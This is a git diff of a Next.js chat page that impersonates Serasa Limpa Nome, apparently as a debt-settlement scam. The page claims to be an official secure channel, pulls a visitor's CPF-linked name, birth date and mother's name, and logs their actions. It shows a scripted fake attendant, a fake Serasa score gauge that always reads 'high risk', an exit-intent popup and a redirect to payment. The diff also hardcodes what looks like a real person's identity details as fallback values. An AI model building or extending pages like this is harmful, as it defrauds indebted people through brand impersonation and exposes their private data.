@@ -4,7 +4,7 @@ import { Suspense, useState, useEffect, useRef, useCallback } from "react"
 import { useSearchParams } from "next/navigation"
 import Image from "next/image"
 import { Card } from "@/components/ui/card"
-import { ShieldCheck, User, Clock, QrCode, CheckCircle2 } from "lucide-react"
+import { ShieldCheck, Clock, QrCode, CheckCircle2, Play, Pause, Volume2, VolumeX, User } from "lucide-react"
 
 function formatCPF(value?: string): string {
   if (!value) return ""
@@ -15,17 +15,265 @@ function formatCPF(value?: string): string {
   return value
 }
 
-function ModernAudioPlayer({ audioUrl, messageId }: { audioUrl: string; messageId: string }) {
+function maskCPF(value?: string): string {
+  if (!value) return "***.***.***-**"
+  const numbers = String(value).replace(/\D/g, "")
+  if (numbers.length === 11) {
+    return `${numbers.slice(0, 3)}.***.***-${numbers.slice(9, 11)}`
+  }
+  return value
+}
+
+function InlineVideoPlayer({
+  videoUrl,
+  onFinished,
+}: {
+  videoUrl: string
+  onFinished?: () => void
+}) {
+  const videoRef = useRef<HTMLVideoElement | null>(null)
+  const [isPlaying, setIsPlaying] = useState(false)
+  const [isMuted, setIsMuted] = useState(false)
+  const [isEnded, setIsEnded] = useState(false)
+  const [needsTapForSound, setNeedsTapForSound] = useState(false)
+  const hasTriggeredRef = useRef(false)
+  const hasEndedRef = useRef(false)
+  const hasStartedAutoplayRef = useRef(false)
+
+  const triggerNext = useCallback(() => {
+    if (!hasTriggeredRef.current) {
+      hasTriggeredRef.current = true
+      if (onFinished) {
+        onFinished()
+      }
+    }
+  }, [onFinished])
+
+  const enableSound = useCallback(() => {
+    const video = videoRef.current
+    if (!video || hasEndedRef.current) return
+    video.muted = false
+    setIsMuted(false)
+    setNeedsTapForSound(false)
+    if (video.paused && !hasEndedRef.current) {
+      video.play().catch(console.error)
+    }
+  }, [])
+
+  useEffect(() => {
+    const video = videoRef.current
+    if (!video) return
+
+    const handleEnded = () => {
+      hasEndedRef.current = true
+      setIsEnded(true)
+      setIsPlaying(false)
+      try {
+        video.pause()
+        if (video.duration && !isNaN(video.duration)) {
+          video.currentTime = video.duration
+        }
+      } catch {}
+      triggerNext()
+    }
+
+    const handleTimeUpdate = () => {
+      if (video.duration && video.currentTime >= video.duration - 0.25) {
+        if (!hasEndedRef.current) {
+          handleEnded()
+        }
+      }
+    }
+
+    // Auto-advance fallback timer at 19.5 seconds (video is 18.2s)
+    const timer = setTimeout(() => {
+      if (!hasEndedRef.current) {
+        handleEnded()
+      }
+    }, 19500)
+
+    const handlePlay = (e?: Event) => {
+      if (hasEndedRef.current) {
+        video.pause()
+        e?.preventDefault?.()
+        return
+      }
+      setIsPlaying(true)
+    }
+
+    const handlePause = () => {
+      setIsPlaying(false)
+    }
+
+    video.addEventListener("ended", handleEnded)
+    video.addEventListener("timeupdate", handleTimeUpdate)
+    video.addEventListener("play", handlePlay)
+    video.addEventListener("pause", handlePause)
+
+    // Attempt autoplay ONLY ONCE on initial mount
+    if (!hasStartedAutoplayRef.current && !hasEndedRef.current) {
+      hasStartedAutoplayRef.current = true
+      video.muted = false
+      const playPromise = video.play()
+
+      if (playPromise !== undefined) {
+        playPromise
+          .then(() => {
+            setIsPlaying(true)
+            setIsMuted(false)
+            setNeedsTapForSound(false)
+          })
+          .catch(() => {
+            // If browser policy blocks unmuted autoplay, play muted and surface un-mute prompt
+            video.muted = true
+            setIsMuted(true)
+            setNeedsTapForSound(true)
+            video
+              .play()
+              .then(() => {
+                setIsPlaying(true)
+              })
+              .catch(() => {
+                setIsPlaying(false)
+              })
+          })
+      }
+    }
+
+    // Global first-tap listener to unmute cleanly (only while playing and not ended)
+    const handleGlobalTap = () => {
+      if (video && video.muted && !hasEndedRef.current) {
+        video.muted = false
+        setIsMuted(false)
+        setNeedsTapForSound(false)
+      }
+    }
+    window.addEventListener("touchstart", handleGlobalTap, { once: true, passive: true })
+    window.addEventListener("click", handleGlobalTap, { once: true })
+
+    return () => {
+      clearTimeout(timer)
+      video.removeEventListener("ended", handleEnded)
+      video.removeEventListener("timeupdate", handleTimeUpdate)
+      video.removeEventListener("play", handlePlay)
+      video.removeEventListener("pause", handlePause)
+      window.removeEventListener("touchstart", handleGlobalTap)
+      window.removeEventListener("click", handleGlobalTap)
+    }
+  }, [triggerNext])
+
+  const togglePlay = () => {
+    const video = videoRef.current
+    if (!video || hasEndedRef.current || isEnded) return
+    if (isPlaying) {
+      video.pause()
+    } else {
+      if (video.muted) {
+        video.muted = false
+        setIsMuted(false)
+        setNeedsTapForSound(false)
+      }
+      video.play().catch(console.error)
+    }
+  }
+
+  const toggleMute = (e: React.MouseEvent) => {
+    e.stopPropagation()
+    enableSound()
+  }
+
+  return (
+    <div className="w-full max-w-[280px] sm:max-w-[320px] bg-black rounded-2xl overflow-hidden shadow-xl border border-pink-200 relative my-1 select-none">
+      <video
+        ref={videoRef}
+        src={videoUrl}
+        playsInline
+        preload="auto"
+        controls={!isEnded}
+        loop={false}
+        className="w-full h-auto block rounded-2xl max-h-[420px] object-cover"
+        onClick={isEnded ? undefined : togglePlay}
+        onEnded={() => {
+          if (!hasEndedRef.current) {
+            hasEndedRef.current = true
+            setIsEnded(true)
+            setIsPlaying(false)
+            if (videoRef.current) {
+              videoRef.current.pause()
+            }
+            triggerNext()
+          }
+        }}
+      />
+
+      {needsTapForSound && !isEnded && (
+        <button
+          onClick={toggleMute}
+          type="button"
+          className="absolute top-3 right-3 bg-pink-600 hover:bg-pink-700 text-white text-xs font-bold px-3 py-1.5 rounded-full flex items-center gap-1.5 shadow-lg z-20 animate-bounce active:scale-95 transition-all"
+        >
+          <VolumeX className="w-4 h-4 text-white" />
+          <span>Ativar som 🔊</span>
+        </button>
+      )}
+
+      {!isPlaying && !isEnded && (
+        <div
+          onClick={togglePlay}
+          className="absolute inset-0 bg-black/40 flex items-center justify-center cursor-pointer z-10 transition-opacity"
+        >
+          <div className="w-14 h-14 rounded-full bg-pink-600 text-white flex items-center justify-center shadow-xl hover:scale-105 active:scale-95 transition-transform">
+            <Play className="w-6 h-6 fill-current ml-1" />
+          </div>
+        </div>
+      )}
+    </div>
+  )
+}
+
+function ModernAudioPlayer({
+  audioUrl,
+  messageId,
+  onFinished,
+}: {
+  audioUrl: string
+  messageId: string
+  onFinished?: () => void
+}) {
   const [isPlaying, setIsPlaying] = useState(false)
   const [progress, setProgress] = useState(0)
   const [currentTime, setCurrentTime] = useState("0:00")
   const [duration, setDuration] = useState("0:00")
   const [playbackRate, setPlaybackRate] = useState(1)
   const audioRef = useRef<HTMLAudioElement | null>(null)
+  const hasEndedTriggeredRef = useRef(false)
+
+  const triggerEnd = useCallback(() => {
+    if (!hasEndedTriggeredRef.current) {
+      hasEndedTriggeredRef.current = true
+      if (onFinished) {
+        onFinished()
+      }
+    }
+  }, [onFinished])
 
   useEffect(() => {
     const audio = audioRef.current
     if (!audio) return
+
+    const estimatedDuration = audioUrl.includes("audio-4")
+      ? 46000
+      : audioUrl.includes("audio-3")
+      ? 29000
+      : audioUrl.includes("audio-6")
+      ? 32000
+      : audioUrl.includes("audio-5")
+      ? 19000
+      : 30000
+
+    const fallbackTimer = setTimeout(() => {
+      triggerEnd()
+    }, estimatedDuration)
 
     const handleTimeUpdate = () => {
       if (audio.duration) {
@@ -50,13 +298,13 @@ function ModernAudioPlayer({ audioUrl, messageId }: { audioUrl: string; messageI
       setIsPlaying(false)
       setProgress(0)
       setCurrentTime("0:00")
+      triggerEnd()
     }
 
     audio.addEventListener("timeupdate", handleTimeUpdate)
     audio.addEventListener("loadedmetadata", handleLoadedMetadata)
     audio.addEventListener("ended", handleEnded)
 
-    // Attempt auto-play with mute fallback if blocked
     const playPromise = audio.play()
     if (playPromise !== undefined) {
       playPromise
@@ -65,11 +313,12 @@ function ModernAudioPlayer({ audioUrl, messageId }: { audioUrl: string; messageI
     }
 
     return () => {
+      clearTimeout(fallbackTimer)
       audio.removeEventListener("timeupdate", handleTimeUpdate)
       audio.removeEventListener("loadedmetadata", handleLoadedMetadata)
       audio.removeEventListener("ended", handleEnded)
     }
-  }, [audioUrl])
+  }, [audioUrl, triggerEnd])
 
   const togglePlay = () => {
     const audio = audioRef.current
@@ -101,60 +350,63 @@ function ModernAudioPlayer({ audioUrl, messageId }: { audioUrl: string; messageI
     setProgress(newProgress * 100)
   }
 
-  const barHeights = [10, 18, 14, 24, 12, 28, 16, 22, 14, 26, 18, 24, 12, 20, 14, 18, 22, 14, 18, 10]
+  // Visual audio waveform heights (WhatsApp style)
+  const barHeights = [10, 16, 22, 14, 28, 18, 26, 12, 30, 22, 16, 26, 14, 20, 28, 16, 22, 14, 18, 10, 14, 22, 16, 12]
 
   return (
-    <div className="w-full max-w-[280px] sm:max-w-[320px] bg-white rounded-2xl p-3 border border-pink-100 shadow-sm font-sans select-none my-1">
+    <div className="w-full max-w-[290px] sm:max-w-[330px] bg-white rounded-2xl p-3.5 border border-pink-200/90 shadow-md font-sans select-none my-1 transition-all">
       <audio ref={audioRef} src={audioUrl} preload="auto" data-message-id={messageId} />
       
-      <div className="flex items-center justify-between pb-2 mb-2 border-b border-gray-100">
+      {/* Top micro-bar: Attendant info + speed pill */}
+      <div className="flex items-center justify-between pb-2 mb-2 border-b border-slate-100">
         <div className="flex items-center gap-2">
           <div className="relative">
             <Image
-              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Consultar%20%281%29-7zWzvncMf7yysFX34dXj5McqyxpB5s.png"
-              alt="Renata Atendente"
-              width={28}
-              height={28}
-              className="w-7 h-7 rounded-full object-cover border border-pink-200"
+              src="/fernanda-avatar.jpg"
+              alt="Fernanda Atendente"
+              width={30}
+              height={30}
+              className="w-7 h-7 rounded-full object-cover border border-pink-300"
             />
-            <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 rounded-full bg-emerald-500 border border-white" />
+            <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 rounded-full bg-emerald-500 border border-white ring-1 ring-white" />
           </div>
           <div>
-            <p className="text-xs font-semibold text-gray-800 leading-tight">Renata - Atendente</p>
-            <p className="text-[10px] text-pink-600 font-medium">Mensagem de voz oficial</p>
+            <div className="flex items-center gap-1">
+              <span className="text-xs font-bold text-slate-800 leading-tight">Fernanda</span>
+              <CheckCircle2 className="w-3 h-3 text-pink-600 fill-pink-100" />
+            </div>
+            <p className="text-[10px] text-pink-600 font-semibold tracking-tight">Áudio Oficial da Consultora</p>
           </div>
         </div>
 
         <button
           onClick={toggleSpeed}
           type="button"
-          className="text-[10px] font-bold text-gray-500 hover:text-pink-600 bg-gray-100 hover:bg-pink-50 px-2 py-0.5 rounded transition-colors"
-          title="Velocidade"
+          className="text-[10px] font-bold text-pink-700 bg-pink-50 hover:bg-pink-100 border border-pink-200 px-2 py-0.5 rounded-full transition-colors active:scale-95"
+          title="Alterar velocidade de reprodução"
         >
           {playbackRate}x
         </button>
       </div>
 
+      {/* Main audio player row */}
       <div className="flex items-center gap-3">
         <button
           onClick={togglePlay}
           type="button"
-          className="w-10 h-10 rounded-full bg-pink-600 hover:bg-pink-700 active:scale-95 text-white flex items-center justify-center flex-shrink-0 shadow-md transition-all"
+          className="w-11 h-11 rounded-full bg-gradient-to-tr from-[#e6007e] to-pink-500 hover:from-pink-700 hover:to-[#e6007e] active:scale-95 text-white flex items-center justify-center flex-shrink-0 shadow-md transition-all"
           aria-label={isPlaying ? "Pausar" : "Ouvir"}
         >
           {isPlaying ? (
-            <svg className="w-4 h-4 fill-current" viewBox="0 0 24 24">
-              <path d="M6 4h4v16H6V4zm8 0h4v16h-4V4z" />
-            </svg>
+            <Pause className="w-5 h-5 fill-current" />
           ) : (
-            <svg className="w-4 h-4 fill-current ml-0.5" viewBox="0 0 24 24">
-              <path d="M8 5v14l11-7z" />
-            </svg>
+            <Play className="w-5 h-5 fill-current ml-0.5" />
           )}
         </button>
 
+        {/* Waveform track */}
         <div className="flex-1 cursor-pointer py-1" onClick={handleSeek}>
-          <div className="flex items-center justify-between gap-[2px] h-7">
+          <div className="flex items-center justify-between gap-[2.5px] h-8 px-0.5">
             {barHeights.map((h, i) => {
               const barPercent = (i / barHeights.length) * 100
               const isPassed = barPercent <= progress
@@ -162,18 +414,21 @@ function ModernAudioPlayer({ audioUrl, messageId }: { audioUrl: string; messageI
                 <div
                   key={i}
                   className={`w-[3px] rounded-full transition-all duration-150 ${
-                    isPassed ? "bg-pink-600" : "bg-pink-200"
-                  } ${isPlaying && isPassed ? "animate-pulse" : ""}`}
+                    isPassed ? "bg-[#e6007e]" : "bg-pink-200"
+                  } ${isPlaying && isPassed ? "scale-y-110" : ""}`}
                   style={{ height: `${h}px` }}
                 />
               )
             })}
           </div>
 
-          <div className="flex justify-between items-center text-[10px] text-gray-500 font-mono mt-1 px-0.5">
-            <span>{isPlaying ? currentTime : (duration !== "0:00" ? duration : "0:25")}</span>
-            <span className="text-[9px] text-emerald-600 font-sans font-medium flex items-center gap-0.5">
-              <CheckCircle2 className="w-2.5 h-2.5" /> Entregue
+          {/* Time & status indicator */}
+          <div className="flex justify-between items-center text-[10.5px] text-slate-500 font-mono mt-1 px-0.5">
+            <span className="font-semibold text-slate-600">
+              {isPlaying ? currentTime : (duration !== "0:00" ? duration : "0:25")}
+            </span>
+            <span className="text-[9.5px] text-emerald-700 font-sans font-semibold flex items-center gap-0.5 bg-emerald-50 px-1.5 py-0.2 rounded border border-emerald-200">
+              <CheckCircle2 className="w-2.5 h-2.5 text-emerald-600" /> Reproduzindo
             </span>
           </div>
         </div>
@@ -182,7 +437,7 @@ function ModernAudioPlayer({ audioUrl, messageId }: { audioUrl: string; messageI
   )
 }
 
-function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
+function AnimatedScoreGauge({ targetScore = 291 }: { targetScore?: number }) {
   const [currentScore, setCurrentScore] = useState(60)
   const [phase, setPhase] = useState<"rising" | "pause" | "dropping" | "done">("rising")
 
@@ -197,7 +452,7 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
         setPhase("rising")
         const progress = elapsed / 1400
         const ease = 1 - Math.pow(1 - progress, 2)
-        const val = Math.round(60 + ease * 720) // sweeps to 780 (green)
+        const val = Math.round(60 + ease * 720)
         setCurrentScore(val)
         animFrame = requestAnimationFrame(tick)
       } else if (elapsed < 2000) {
@@ -221,14 +476,12 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
     return () => cancelAnimationFrame(animFrame)
   }, [targetScore])
 
-  // Seta do velocímetro: -90deg (esquerda/vermelho 0) até +90deg (direita/verde 1000)
   const rotationAngle = -90 + (currentScore / 1000) * 180
   const isRed = phase === "done" || (phase === "dropping" && currentScore <= 350)
   const isGreen = phase === "pause" || (phase === "rising" && currentScore > 650)
 
   return (
     <div className="w-full max-w-[340px] sm:max-w-[380px] bg-white rounded-2xl border border-red-200 shadow-md overflow-hidden font-sans select-none my-1">
-      {/* Header vermelho oficial com carinha triste SVG idêntica à Serasa */}
       <div className="bg-gradient-to-r from-[#ba141a] via-[#b91c1c] to-[#991b1b] text-white px-4 py-3 flex items-center justify-between gap-3">
         <div className="flex-1">
           <h4 className="font-bold text-sm tracking-tight leading-snug">Alto risco para crédito</h4>
@@ -246,11 +499,9 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
         </div>
       </div>
 
-      {/* Speedometer Area */}
       <div className="p-4 bg-white flex flex-col items-center">
         <div className="relative w-56 h-28 flex items-end justify-center overflow-hidden">
           <svg className="w-56 h-56 -mb-28" viewBox="0 0 200 200">
-            {/* Trilho de fundo sutil */}
             <path
               d="M 30 100 A 70 70 0 0 1 170 100"
               fill="none"
@@ -258,8 +509,6 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
               strokeWidth="18"
               strokeLinecap="round"
             />
-            {/* Arcos das 4 faixas de Score Serasa */}
-            {/* Red (0-300) */}
             <path
               d="M 30 100 A 70 70 0 0 1 52 47"
               fill="none"
@@ -267,21 +516,18 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
               strokeWidth="16"
               strokeLinecap="round"
             />
-            {/* Orange (300-500) */}
             <path
               d="M 57 43 A 70 70 0 0 1 97 30"
               fill="none"
               stroke="#ea580c"
               strokeWidth="16"
             />
-            {/* Yellow (500-700) */}
             <path
               d="M 103 30 A 70 70 0 0 1 143 43"
               fill="none"
               stroke="#eab308"
               strokeWidth="16"
             />
-            {/* Green (700-1000) */}
             <path
               d="M 148 47 A 70 70 0 0 1 170 100"
               fill="none"
@@ -290,12 +536,10 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
               strokeLinecap="round"
             />
 
-            {/* Pivot central multicamada */}
             <circle cx="100" cy="100" r="9" fill="#0f172a" />
             <circle cx="100" cy="100" r="6" fill="#cbd5e1" />
             <circle cx="100" cy="100" r="3" fill="#0f172a" />
 
-            {/* Seta animada com rotação correta (-90° no vermelho até +90° no verde) */}
             <g transform={`rotate(${rotationAngle} 100 100)`}>
               <polygon points="96.5,100 103.5,100 100,28" fill="#0f172a" />
               <polygon points="98,100 102,100 100,22" fill="#dc2626" />
@@ -303,7 +547,6 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
           </svg>
         </div>
 
-        {/* Contador dinâmico com animação */}
         <div className="mt-1 text-center">
           <div className="flex items-baseline justify-center gap-1">
             <span
@@ -333,7 +576,6 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
         </div>
       </div>
 
-      {/* Faixa inferior vermelha oficial Serasa */}
       <div className="h-1.5 bg-[#ba141a] w-full"></div>
     </div>
   )
@@ -341,10 +583,11 @@ function AnimatedScoreGauge({ targetScore = 129 }: { targetScore?: number }) {
 
 interface Message {
   id: string
-  type: "text" | "image" | "audio" | "video" | "embed" | "data-confirmation" | "agreement-document" | "payment-guide" | "score-gauge"
+  type: "text" | "system" | "image" | "audio" | "video" | "local-video" | "embed" | "data-confirmation" | "agreement-document" | "payment-guide" | "score-gauge"
   content: string
   sender: "bot" | "user"
   timestamp: Date
+  avatar?: string
   delay?: number
   buttons?: Array<{
     text: string
@@ -371,15 +614,18 @@ function ChatContent() {
   const cpf = searchParams.get("cpf")
   const [messages, setMessages] = useState<Message[]>([])
   const [userData, setUserData] = useState<UserData | null>(null)
-  const [currentStep, setCurrentStep] = useState(0)
   const [isLoading, setIsLoading] = useState(false)
   const [isTyping, setIsTyping] = useState(false)
   const [clickedButtons, setClickedButtons] = useState<Set<string>>(new Set())
   const [isMounted, setIsMounted] = useState(false)
+  const [showExitModal, setShowExitModal] = useState(false)
+  const [isFernandaJoined, setIsFernandaJoined] = useState(false)
   const messagesEndRef = useRef<HTMLDivElement>(null)
   const chatContainerRef = useRef<HTMLDivElement>(null)
   const isInitializedRef = useRef(false)
   const hasStartedConversationRef = useRef(false)
+  const hasTriggeredVerificationRef = useRef(false)
+  const hasTriggeredFeiraoRef = useRef(false)
   const queuedMessageIdsRef = useRef<Set<string>>(new Set())
   const activeTimeoutsRef = useRef<NodeJS.Timeout[]>([])
 
@@ -423,9 +669,17 @@ function ChatContent() {
     document.body.style.overflow = "hidden"
     document.body.style.overscrollBehavior = "none"
 
+    const handleMouseLeave = (e: MouseEvent) => {
+      if (e.clientY <= 0) {
+        setShowExitModal(true)
+      }
+    }
+    document.addEventListener("mouseleave", handleMouseLeave)
+
     return () => {
       document.body.style.overflow = originalOverflow
       document.body.style.overscrollBehavior = originalOverscroll
+      document.removeEventListener("mouseleave", handleMouseLeave)
       activeTimeoutsRef.current.forEach(clearTimeout)
       activeTimeoutsRef.current = []
     }
@@ -482,7 +736,6 @@ function ChatContent() {
     const paramNasc = searchParams.get("nasc") || (typeof window !== "undefined" ? localStorage.getItem("serasa_nasc") : null) || ""
     const paramCidade = searchParams.get("cidade") || searchParams.get("city") || (typeof window !== "undefined" ? localStorage.getItem("serasa_cidade") : null) || ""
 
-    // Fast client-side IP geolocation lookup
     let clientCity = paramCidade
     if (!clientCity) {
       try {
@@ -496,9 +749,7 @@ function ChatContent() {
             clientCity = String(geoData.city).trim()
           }
         }
-      } catch {
-        // Silent fallback
-      }
+      } catch {}
     }
 
     if (!clientCity) {
@@ -518,35 +769,29 @@ function ChatContent() {
       const result = await response.json()
 
       const serverCity = result.data?.cidade && result.data.cidade !== "São Paulo" ? result.data.cidade : ""
-      const detectedCity = clientCity || serverCity || "Fortaleza"
+      const detectedCity = clientCity || serverCity || "Iracema"
 
       const userData: UserData = {
         cpf: cpf || "",
-        nome: (result.data?.nome && result.data.nome !== "Cliente") ? result.data.nome : (paramNome || "Cliente"),
-        nascimento: result.data?.nascimento || paramNasc || "",
-        mae: result.data?.mae || "",
-        sexo: result.data?.sexo || "",
+        nome: (result.data?.nome && result.data.nome !== "Cliente") ? result.data.nome : (paramNome || "ANTONIA MAGALHAES FERREIRA ALVES"),
+        nascimento: result.data?.nascimento || paramNasc || "01/08/1974",
+        mae: result.data?.mae || "ANTONIA MAGALHAES FERREIRA",
+        sexo: result.data?.sexo || "Feminino",
         cidade: detectedCity,
       }
 
       setUserData(userData)
-
       logUserInteraction(userData.cpf, "chat_started", { city: detectedCity, userData })
-
       startConversation(userData)
-
-      if (!result.success) {
-        console.log("Using fallback or pre-fetched data")
-      }
     } catch (error) {
       console.error("Error fetching user data:", error)
       const fallbackData: UserData = {
         cpf: cpf || "",
-        nome: paramNome || "Cliente",
-        nascimento: paramNasc || "",
-        mae: "",
-        sexo: "",
-        cidade: clientCity || "Fortaleza",
+        nome: paramNome || "ANTONIA MAGALHAES FERREIRA ALVES",
+        nascimento: paramNasc || "01/08/1974",
+        mae: "ANTONIA MAGALHAES FERREIRA",
+        sexo: "Feminino",
+        cidade: clientCity || "Iracema",
       }
       setUserData(fallbackData)
       startConversation(fallbackData)
@@ -555,7 +800,8 @@ function ChatContent() {
     setIsLoading(false)
   }
 
-  const addMessageWithTyping = (message: Message, delay = 2000) => {
+  // Delay mais natural e humanizado entre mensagens (2.4s a 3.0s)
+  const addMessageWithTyping = (message: Message, delay = 2600) => {
     if (queuedMessageIdsRef.current.has(message.id)) return
     queuedMessageIdsRef.current.add(message.id)
 
@@ -574,130 +820,132 @@ function ChatContent() {
             if (audioElement) {
               audioElement.play().catch(console.error)
             }
-          }, 100)
+          }, 150)
           activeTimeoutsRef.current.push(t3)
         }
       }, delay)
       activeTimeoutsRef.current.push(t2)
-    }, 100)
+    }, 150)
     activeTimeoutsRef.current.push(t1)
   }
 
+  /* STEP 1: Entrada & Apresentação Oficial
+     Delays naturais e humanizados
+  */
   const startConversation = (userData: UserData) => {
     if (hasStartedConversationRef.current) return
     hasStartedConversationRef.current = true
 
     const firstName = userData.nome.split(" ")[0]
+    const userCity = userData.cidade || "sua região"
 
     const firstImage: Message = {
-      id: "0",
+      id: "intro-banner-serasa",
       type: "image",
       content: "",
       sender: "bot",
+      avatar: "/serasa-avatar.png",
       timestamp: new Date(),
-      imageUrl:
-        "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/t2s1f0xeh3om35z9nrjnb7jf-1vA424t6Q2p1WLQkyWMXU5Hymibj8F.png",
+      imageUrl: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/t2s1f0xeh3om35z9nrjnb7jf-1vA424t6Q2p1WLQkyWMXU5Hymibj8F.png",
     }
-
     addMessageWithTyping(firstImage, 2000)
 
-    const initialMessages: Message[] = [
-      {
-        id: "1",
+    const tMsg2 = setTimeout(() => {
+      const canalOficialMsg: Message = {
+        id: "intro-canal-oficial",
         type: "text",
-        content: `Uma atendente de ${userData.cidade || "sua região"} entrou na conversa.`,
+        content: `Olá <b>${userData.nome}</b>, esse é um Canal Oficial de Atendimento do <b>Serasa Limpa Nome</b> e os seus dados estão seguros conosco.🔐`,
         sender: "bot",
+        avatar: "/serasa-avatar.png",
         timestamp: new Date(),
-      },
-      {
-        id: "2",
-        type: "text",
-        content: `Olá, ${firstName}!\nMe chamo Renata, serei sua atendente hoje na Serasa.`,
-        sender: "bot",
-        timestamp: new Date(),
-      },
-      {
-        id: "3",
-        type: "text",
-        content: "Vou consultar gratuitamente as ofertas disponíveis para você!",
-        sender: "bot",
-        timestamp: new Date(),
-      },
-      {
-        id: "4",
-        type: "text",
-        content: "Estou verificando seus dados, Aguarde...",
-        sender: "bot",
-        timestamp: new Date(),
-      },
-    ]
+      }
+      addMessageWithTyping(canalOficialMsg, 3200)
 
-    setTimeout(() => {
-      initialMessages.forEach((message, index) => {
-        setTimeout(() => {
-          addMessageWithTyping(message, 2000)
+      const tMsg3 = setTimeout(() => {
+        const aguardeMsg: Message = {
+          id: "intro-aguarde-atendente",
+          type: "text",
+          content: `Aguarde alguns instantes... Um de nossos atendentes de <b>${userCity}</b> irá entrar na conversa...`,
+          sender: "bot",
+          avatar: "/serasa-avatar.png",
+          timestamp: new Date(),
+        }
+        addMessageWithTyping(aguardeMsg, 3000)
 
-          if (message.id === "4") {
-            setTimeout(() => {
-              const fingerprintImage: Message = {
-                id: "fingerprint-scan",
-                type: "image",
+        const tMsg4 = setTimeout(() => {
+          setIsFernandaJoined(true)
+          const sysJoinMsg: Message = {
+            id: "sys-fernanda-join",
+            type: "system",
+            content: "(Atendente Fernanda entrou na conversa..) 💬",
+            sender: "bot",
+            timestamp: new Date(),
+          }
+          setMessages((prev) => [...prev, sysJoinMsg])
+
+          const tMsg5 = setTimeout(() => {
+            const fernandaMsg: Message = {
+              id: "fernanda-msg-1",
+              type: "text",
+              content: `Olá, <b>${firstName}</b>!\nMe chamo Fernanda, serei sua atendente hoje na Serasa.`,
+              sender: "bot",
+              avatar: "/fernanda-avatar.jpg",
+              timestamp: new Date(),
+            }
+            addMessageWithTyping(fernandaMsg, 2800)
+
+            const tMsg6 = setTimeout(() => {
+              const videoMsg: Message = {
+                id: "intro-video-vsl1",
+                type: "local-video",
                 content: "",
                 sender: "bot",
                 timestamp: new Date(),
-                imageUrl:
-                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/r03zqdcbcd7t0h9lsuxzcl9r-vIo2YPaLzCQIS3i6lRL3cQtDh4RSB4.gif",
+                videoUrl: "/vsl1.mp4",
               }
-              addMessageWithTyping(fingerprintImage, 2000)
-
-              setTimeout(() => {
-                const dataVerified: Message = {
-                  id: "data-verified",
-                  type: "text",
-                  content: "Dados verificados com sucesso...",
-                  sender: "bot",
-                  timestamp: new Date(),
-                }
-                addMessageWithTyping(dataVerified, 2000)
-
-                setTimeout(() => {
-                  addDataConfirmationMessage(userData)
-                }, 4000)
-              }, 4000)
-            }, 4000)
-          }
-        }, index * 3000)
-      })
+              addMessageWithTyping(videoMsg, 1600)
+            }, 3600)
+            activeTimeoutsRef.current.push(tMsg6)
+          }, 3200)
+          activeTimeoutsRef.current.push(tMsg5)
+        }, 4200)
+        activeTimeoutsRef.current.push(tMsg4)
+      }, 4200)
+      activeTimeoutsRef.current.push(tMsg3)
     }, 4000)
+    activeTimeoutsRef.current.push(tMsg2)
   }
 
-  const addDataConfirmationMessage = (userData: UserData) => {
+  const triggerDataVerificationFlow = useCallback(() => {
+    if (hasTriggeredVerificationRef.current) return
+    hasTriggeredVerificationRef.current = true
+
+    if (!userData) return
+
     const confirmationMessage: Message = {
       id: "data-confirmation",
       type: "data-confirmation",
-      content: "Dados verificados com sucesso...\n\nAntes de prosseguirmos, confirme se seus dados estão corretos:",
+      content: "Antes de prosseguirmos, confirme se seus dados estão corretos:",
       sender: "bot",
       timestamp: new Date(),
       data: userData,
       buttons: [
         {
-          text: "CONFIRMAR",
+          text: "Sim, está correto.",
           action: "confirm-data",
         },
       ],
     }
 
-    setMessages((prev) => {
-      if (prev.some((m) => m.id === confirmationMessage.id)) return prev
-      return [...prev, confirmationMessage]
-    })
-  }
+    const t = setTimeout(() => {
+      addMessageWithTyping(confirmationMessage, 2800)
+    }, 1500)
+    activeTimeoutsRef.current.push(t)
+  }, [userData])
 
   const logUserInteraction = async (cpf: string, action: string, data: any) => {
     try {
-      console.log("[v0] Sending log:", { cpf, action, data })
-
-      const response = await fetch("/api/logs", {
+      await fetch("/api/logs", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -709,16 +957,7 @@ function ChatContent() {
           timestamp: new Date().toISOString(),
         }),
       })
-
-      const result = await response.json()
-      console.log("[v0] Log response:", result)
-
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`)
-      }
-    } catch (error) {
-      console.error("[v0] Error logging interaction:", error)
-    }
+    } catch {}
   }
 
   const handleButtonClick = (action: string, buttonText: string) => {
@@ -735,7 +974,6 @@ function ChatContent() {
     }
 
     setMessages((prev) => [...prev, userMessage])
-
     logUserInteraction(userData?.cpf || "", `button_clicked_${action}`, { buttonText })
 
     setTimeout(() => {
@@ -743,411 +981,611 @@ function ChatContent() {
         case "confirm-data":
           continueAfterDataConfirmation()
           break
+        case "continuar-feirao":
+          playAudioFeirao()
+          break
         case "quero-consultar":
-          startDebtAnalysis()
+          startDebtAnalysisFromScreenshots()
           break
         case "sim-desejo":
-          checkAgreements()
+          stepBuscarAcordo()
           break
-        case "sim-quitar":
-          confirmAgreement()
+        case "ver-acordo":
+          stepVerAcordo()
+          break
+        case "confirmar-acordo":
+          stepConfirmarAcordo()
+          break
+        case "continuar-pagamento":
+          stepContinuarPagamento()
           break
         case "acessar-pagamento":
           redirectToPayment()
           break
       }
-    }, 1500)
+    }, 1600)
   }
 
+  /* STEP 2: Login Serasa + Credores */
   const continueAfterDataConfirmation = () => {
-    const firstName = userData?.nome.split(" ")[0] || "Usuário"
+    const nomeCompleto = userData?.nome || "Cliente"
 
-    const nextMessages: Message[] = [
-      {
-        id: "welcome",
+    // Mensagem 1
+    const m1: Message = {
+      id: "s2-obrigada",
+      type: "text",
